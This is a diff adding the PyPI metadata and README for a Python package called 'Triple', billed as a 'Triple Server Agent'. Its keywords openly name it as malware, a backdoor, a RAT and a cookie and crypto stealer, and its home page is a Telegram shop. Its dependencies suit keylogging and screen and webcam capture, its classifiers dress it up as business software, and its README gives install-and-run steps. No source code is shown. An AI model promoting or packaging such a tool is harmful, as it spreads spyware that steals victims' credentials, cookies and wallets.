@@ -1,0 +1,58 @@
+Metadata-Version: 2.1
+Name: Triple
+Version: 1.1.0
+Summary: Triple Server Agent
+Home-page: https://t.me/xryptbxshop
+Author: Oliver Walker
+Author-email: oliverwalker@xmpp.jp
+Maintainer: Oliver Walker (@oliverwalkerjp)
+Maintainer-email: oliverwalker@xmpp.jp
+License: GPL3
+Keywords: malware,backdoor,python,rat,crypto,stealer,cookies,logs,browser logs,explorer,trojan
+Classifier: Environment :: Console
+Classifier: Intended Audience :: Developers
+Classifier: License :: OSI Approved :: BSD License
+Classifier: Topic :: Office/Business
+Classifier: Topic :: Software Development :: Libraries :: Application Frameworks
+Classifier: Topic :: Software Development :: Libraries :: Python Modules
+Classifier: Operating System :: OS Independent
+Classifier: Programming Language :: Python :: 3
+Classifier: Programming Language :: Python :: 3.4
+Classifier: Programming Language :: Python :: 3.5
+Classifier: Programming Language :: Python :: 3.6
+Classifier: Programming Language :: Python :: 3.7
+Classifier: Programming Language :: Python :: 3.8
+Classifier: Programming Language :: Python :: 3.9
+Classifier: Programming Language :: Python :: 3.10
+Classifier: Programming Language :: Python :: 3.11
+Classifier: Programming Language :: Python :: 3.12
+Classifier: Programming Language :: Python
+Requires-Python: >3, >=3.3
+Description-Content-Type: text/markdown
+Requires-Dist: opencv-python
+Requires-Dist: imageio
+Requires-Dist: Pillow
+Requires-Dist: keyboard
+Requires-Dist: pyautogui
+Requires-Dist: rich
+Requires-Dist: pyfiglet
+
+# Triple
+
+[![Build Status](https://img.shields.io/pypi/v/triple)](https://pypi.python.org/pypi/triple)
+[![Downloads](https://pepy.tech/badge/triple)](https://pypi.python.org/pypi/triple)
+[![Python Version](https://img.shields.io/pypi/pyversions/triple)](https://pypi.python.org/pypi/triple)
+[![License](https://img.shields.io/pypi/l/triple)](https://pypi.python.org/pypi/triple)
+
+
+Triple Server Agent.
+
+**How to use**
+
+After Installation Open Terminal(MAC, Linux), Command Prompt(Windows) and type : 
+
+```
+$ triple -s
+```
+**GOOD LUCK**
+
